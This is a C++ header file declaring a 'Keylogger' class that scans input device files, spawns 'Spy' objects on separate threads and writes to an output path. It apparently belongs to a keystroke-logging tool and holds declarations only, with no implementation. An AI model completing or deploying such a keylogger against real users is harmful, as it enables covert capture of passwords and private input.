#ifndef KEYLOGGER_HPP_
#define KEYLOGGER_HPP_

#include <string>
#include <vector>
#include "Spy/Spy.hpp"
#include <future>

using directory = struct dirent;

namespace kl
{

    class Keylogger
    {
    public:
        Keylogger(std::string, bool, std::vector<std::string>);
        virtual ~Keylogger() = default;
        void start();

    private:
        void _findInputFile(const std::vector<std::string> &);
        int _openR(std::string ) const;
        void _scanDir(std::string &);
        void _scanFile(std::string &, struct dirent **, size_t);
        void _createSpies();

    private:
        std::string _outputPath;
        bool _debug;
        std::vector<std::string>_inputs;
        std::vector<Spy> _spies;
        std::vector<std::future<void>> _asyncThreads;
    };
}

#endif /* !KEYLOGGER_HPP_ */
